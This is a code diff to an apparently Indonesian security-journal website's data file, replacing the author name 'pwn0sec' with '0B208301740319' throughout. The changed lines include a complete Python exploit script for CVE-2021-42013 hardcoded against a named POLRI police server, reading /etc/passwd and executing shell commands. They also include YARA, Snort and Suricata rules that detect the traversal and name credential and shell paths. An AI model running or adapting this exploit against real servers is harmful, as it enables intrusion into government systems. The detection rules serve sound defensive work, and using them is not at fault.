@@ -28,7 +28,7 @@ export const documents: ResearchDocument[] = [
     subtitle: "Analisis Kritis: AI Slop, Pseudo-Pakar, dan Kursus Online Predatif dalam Ekosistem Keamanan Siber Indonesia",
     classification: "PUBLIC",
     date: "April 2025",
-    authors: ["pwn0sec"],
+    authors: ["0B208301740319"],
     organization: "DPTL/0B208301740319",
     volume: "Vol. 1 | No. 1",
     pages: 25,
@@ -404,7 +404,7 @@ export const documents: ResearchDocument[] = [
       }
     ],
     references: [
-      "pwn0sec. (2025). Please Stop Waste Your Time for Reporting a False Security Vulnerabilities Used AI! Medium.",
+      "0B208301740319. (2025). Please Stop Waste Your Time for Reporting a False Security Vulnerabilities Used AI! Medium.",
       "Hacker News / Y Combinator. (2024). AI slop security reports submitted to curl. Hacker News.",
       "HackerOne. (2024). Disclosed Report: Buffer Overflow Risk in Curl_inet_ntop -- curl. https://hackerone.com/reports/2613898",
       "HackerOne. (2024). Disclosed Report: Silent TLS Trust Model Hijacking via Design -- curl. https://hackerone.com/reports/2495293",
@@ -427,7 +427,7 @@ export const documents: ResearchDocument[] = [
     subtitle: "Analisis kritis dan sistematis terhadap instanisasi profesi teknologi dan miskonsepsi publik tentang definisi, kapabilitas, dan etika seorang hacker dalam ekosistem teknologi Indonesia",
     classification: "PUBLIC",
     date: "April 2025",
-    authors: ["number01", "pwn0sec"],
+    authors: ["number01", "0B208301740319"],
     organization: "DPTL/0B208301740319",
     volume: "Vol. 1 | No. 2 | Seri II",
     pages: 30,
@@ -804,7 +804,7 @@ export const documents: ResearchDocument[] = [
     ],
     references: [
       "number01. (2025). Fenomena Developer Instan dan Miskonsepsi Tentang Hacker/Cybersecurity, Episode III. Medium. https://medium.com/@number01/fenomena-developer-instan-dan-miskonsepsi-tentang-hacker-cybersec-episode-iii-d5e4f5a03f5a",
-      "pwn0sec. (2025). Ilusi Otomatisasi versus Realitas Eksploitasi: Mengapa AI Tidak Dapat Menggantikan Peneliti Keamanan (Jurnal Seri I). Jurnal Keamanan Siber dan Etika Teknologi Indonesia, Vol. 1 No. 1.",
+      "0B208301740319. (2025). Ilusi Otomatisasi versus Realitas Eksploitasi: Mengapa AI Tidak Dapat Menggantikan Peneliti Keamanan (Jurnal Seri I). Jurnal Keamanan Siber dan Etika Teknologi Indonesia, Vol. 1 No. 1.",
       "Levy, S. (1984). Hackers: Heroes of the Computer Revolution. Anchor Press/Doubleday.",
       "Dunning, D. & Kruger, J. (1999). Unskilled and Unaware of It: How Difficulties in Recognizing One's Own Incompetence Lead to Inflated Self-Assessments. Journal of Personality and Social Psychology, 77(6), 1121-1134.",
       "OWASP Foundation. (2021). OWASP Top 10 Web Application Security Risks. https://owasp.org/Top10/",
@@ -1210,7 +1210,7 @@ export const documents: ResearchDocument[] = [
     subtitle: "Analisis Mendalam Kerentanan Double URL-Encoding pada Infrastruktur Kepolisian Negara Republik Indonesia (POLRI) - Path Traversal, Privilege Escalation & RCE pada Apache HTTP Server 2.4.50",
     classification: "CONFIDENTIAL",
     date: "January 2024",
-    authors: ["pwn0sec"],
+    authors: ["0B208301740319"],
     organization: "DPTL/0B208301740319",
     volume: "Vol. 1 | No. 4",
     pages: 27,
@@ -1467,7 +1467,7 @@ export const documents: ResearchDocument[] = [
         title: "12.2 Python Script - Automated Exploitation",
         level: 2,
         content: [
-          "[CODE_PYTHON:#!/usr/bin/env python3 | # CVE-2021-42013 Automated Exploit - Educational PoC | # Author: pwn0sec | For research purposes only |  | import requests | import sys | from urllib.parse import quote |  | TARGET = 'http://dumaspresisi.itwasum.polri.go.id:8080' | DEPTH  = 7  # traversal depth |  | def build_payload(target_file): |     traversal = '%%32%65%%32%65/' * DEPTH |     return f'/icons/{traversal}{target_file.lstrip(\"/\")}' |  | def read_file(target_file): |     url = TARGET + build_payload(target_file) |     resp = requests.get(url, allow_redirects=False, |                         headers={'User-Agent': 'Mozilla/5.0'}) |     if resp.status_code == 200: |         return resp.text |     return None |  | def rce(command): |     url = TARGET + build_payload('/bin/sh') |     data = f'echo;{command}' |     resp = requests.post(url, data=data, allow_redirects=False, |                          headers={'Content-Type':'application/x-www-form-urlencoded'}) |     if resp.status_code == 200: |         return resp.text.strip() |     return None |  | if __name__ == '__main__': |     print('[*] CVE-2021-42013 PoC') |     print('[*] Reading /etc/passwd...') |     result = read_file('/etc/passwd') |     if result: |         print('[+] SUCCESS:', result[:100]) |     print('[*] Executing id command...') |     output = rce('id') |     if output: |         print('[+] RCE SUCCESS:', output)]"
+          "[CODE_PYTHON:#!/usr/bin/env python3 | # CVE-2021-42013 Automated Exploit - Educational PoC | # Author: 0B208301740319 | For research purposes only |  | import requests | import sys | from urllib.parse import quote |  | TARGET = 'http://dumaspresisi.itwasum.polri.go.id:8080' | DEPTH  = 7  # traversal depth |  | def build_payload(target_file): |     traversal = '%%32%65%%32%65/' * DEPTH |     return f'/icons/{traversal}{target_file.lstrip(\"/\")}' |  | def read_file(target_file): |     url = TARGET + build_payload(target_file) |     resp = requests.get(url, allow_redirects=False, |                         headers={'User-Agent': 'Mozilla/5.0'}) |     if resp.status_code == 200: |         return resp.text |     return None |  | def rce(command): |     url = TARGET + build_payload('/bin/sh') |     data = f'echo;{command}' |     resp = requests.post(url, data=data, allow_redirects=False, |                          headers={'Content-Type':'application/x-www-form-urlencoded'}) |     if resp.status_code == 200: |         return resp.text.strip() |     return None |  | if __name__ == '__main__': |     print('[*] CVE-2021-42013 PoC') |     print('[*] Reading /etc/passwd...') |     result = read_file('/etc/passwd') |     if result: |         print('[+] SUCCESS:', result[:100]) |     print('[*] Executing id command...') |     output = rce('id') |     if output: |         print('[+] RCE SUCCESS:', output)]"
         ]
       },
       {
@@ -1530,7 +1530,7 @@ export const documents: ResearchDocument[] = [
         title: "16. Detection Engineering - YARA & IDS Rules",
         level: 1,
         content: [
-          "[CODE_YARA:/* | * YARA Rule: CVE-2021-42013 Apache Path Traversal Detection | * Author    : pwn0sec Security Research | * Date      : 2024-01-07 | * Target    : Apache access.log / error.log | */ | rule CVE_2021_42013_PathTraversal { |   meta: |     description = \"Detects CVE-2021-42013 double URL-encoded path traversal\" |     author      = \"pwn0sec\" |     severity    = \"critical\" |     cve         = \"CVE-2021-42013\" |   strings: |     $dbl_enc_1  = \"%%32%65\" ascii nocase |     $dbl_enc_2  = \"%%32%45\" ascii nocase |     $target_1   = \"/etc/passwd\" ascii |     $target_2   = \"/etc/shadow\" ascii |     $target_3   = \"/bin/sh\"     ascii |     $target_4   = \"/bin/bash\"   ascii |     $target_5   = \"/.ssh/\"      ascii |     $sgl_enc_1  = \".%2e/\" ascii nocase |     $sgl_enc_2  = \"%2e./\" ascii nocase |   condition: |     (($dbl_enc_1 or $dbl_enc_2) and any of ($target_*)) |     or |     (($sgl_enc_1 or $sgl_enc_2) and any of ($target_*)) | }]",
+          "[CODE_YARA:/* | * YARA Rule: CVE-2021-42013 Apache Path Traversal Detection | * Author    : 0B208301740319 Security Research | * Date      : 2024-01-07 | * Target    : Apache access.log / error.log | */ | rule CVE_2021_42013_PathTraversal { |   meta: |     description = \"Detects CVE-2021-42013 double URL-encoded path traversal\" |     author      = \"0B208301740319\" |     severity    = \"critical\" |     cve         = \"CVE-2021-42013\" |   strings: |     $dbl_enc_1  = \"%%32%65\" ascii nocase |     $dbl_enc_2  = \"%%32%45\" ascii nocase |     $target_1   = \"/etc/passwd\" ascii |     $target_2   = \"/etc/shadow\" ascii |     $target_3   = \"/bin/sh\"     ascii |     $target_4   = \"/bin/bash\"   ascii |     $target_5   = \"/.ssh/\"      ascii |     $sgl_enc_1  = \".%2e/\" ascii nocase |     $sgl_enc_2  = \"%2e./\" ascii nocase |   condition: |     (($dbl_enc_1 or $dbl_enc_2) and any of ($target_*)) |     or |     (($sgl_enc_1 or $sgl_enc_2) and any of ($target_*)) | }]",
           "",
           "[CODE:# Snort Rule - CVE-2021-42013 Detection | alert tcp any any -> $HTTP_SERVERS [80,8080,443,8443] ( |     msg:\"CVE-2021-42013 Apache HTTP Server Double URL-Encoded Path Traversal\"; |     flow:established,to_server; |     content:\"%%32%65\"; http_uri; nocase; |     pcre:\"/%%32%65%%32%65/Ui\"; |     classtype:web-application-attack; |     sid:9000001; rev:1; |     reference:cve,2021-42013; | ) |  | # Suricata Rule - RCE Detection | alert http any any -> $HTTP_SERVERS any ( |     msg:\"CVE-2021-42013 Apache RCE via /bin/sh\"; |     flow:established,to_server; |     http.method; content:\"POST\"; |     http.uri; content:\"bin/sh\"; nocase; |     http.uri; content:\"%%32%65\"; nocase; |     classtype:attempted-admin; |     sid:9000002; rev:1; | )]",
           "",
@@ -1613,7 +1613,7 @@ export const documents: ResearchDocument[] = [
         title: "22. References & Further Reading",
         level: 1,
         content: [
-          "Referensi utama mencakup CVE-2021-42013 dan CVE-2021-41773 dari NVD, Apache Security Advisory, CISA KEV Catalog, Qualys Blog Analysis, pwn0sec Research, dan Ghidra SRE Framework.",
+          "Referensi utama mencakup CVE-2021-42013 dan CVE-2021-41773 dari NVD, Apache Security Advisory, CISA KEV Catalog, Qualys Blog Analysis, 0B208301740319 Research, dan Ghidra SRE Framework.",
           "Referensi teknis tambahan: RFC 3986 (URI Generic Syntax), OWASP Path Traversal, PTES Standard, ModSecurity Documentation, YARA Documentation, CIS Apache Benchmark, dan NIST SP 800-44."
         ]
       }
@@ -1625,7 +1625,7 @@ export const documents: ResearchDocument[] = [
       "Apache Software Foundation. Apache 2.4.51 Release Notes & Changelog. https://httpd.apache.org/changelog-2.4.html",
       "CISA. Known Exploited Vulnerabilities (KEV) Catalog. https://cisa.gov/known-exploited-vulnerabilities-catalog",
       "Qualys Security Blog. Deep Analysis: CVE-2021-41773 & CVE-2021-42013. https://blog.qualys.com",
-      "pwn0sec Security Research. Responsible Disclosure - Kerentanan pada Infrastruktur POLRI. https://pwn0sec.medium.com",
+      "0B208301740319 Security Research. Responsible Disclosure - Kerentanan pada Infrastruktur POLRI. https://0B208301740319.medium.com",
       "National Security Agency (NSA). Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org/",
       "IETF. RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax. https://tools.ietf.org/html/rfc3986",
       "OWASP Foundation. Path Traversal Attack Documentation. https://owasp.org/www-community/attacks/Path_Traversal",
@@ -1992,7 +1992,7 @@ export const documents: ResearchDocument[] = [
           "Referensi CVE dan Platform",
           "-- CVE-2020-11798 - NVD - nvd.nist.gov/vuln/detail/CVE-2020-11798",
           "-- Mitel MiCollab Security - Mitel Security Advisories - mitel.com/support/security-advisories",
-          "-- pwn0sec Bug Bounty PoC - pwn0sec.medium.com - Original bug bounty documentation",
+          "-- 0B208301740319 Bug Bounty PoC - 0B208301740319.medium.com - Original bug bounty documentation",
           "-- Ferrari Bug Bounty Program - Ferrari Private Bug Bounty - Managed through HackerOne/internal platform",
           "-- OWASP Path Traversal - owasp.org/www-community/attacks/Path_Traversal",
           "-- OWASP Testing Guide v4.2 - owasp.org/www-project-web-security-testing-guide - OTG-AUTHZ-001",
@@ -2013,7 +2013,7 @@ export const documents: ResearchDocument[] = [
     references: [
       "NVD. CVE-2020-11798 - Path Traversal in MiCollab vcs_access_file.cgi. https://nvd.nist.gov/vuln/detail/CVE-2020-11798",
       "Mitel Networks. MiCollab Security Advisories. https://mitel.com/support/security-advisories",
-      "pwn0sec. Original Bug Bounty PoC Documentation. https://pwn0sec.medium.com",
+      "0B208301740319. Original Bug Bounty PoC Documentation. https://0B208301740319.medium.com",
       "Ferrari Private Bug Bounty Program. Managed through HackerOne/internal platform",
       "OWASP. Path Traversal Attack Documentation. https://owasp.org/www-community/attacks/Path_Traversal",
       "OWASP. Web Security Testing Guide v4.2 - OTG-AUTHZ-001. https://owasp.org/www-project-web-security-testing-guide",
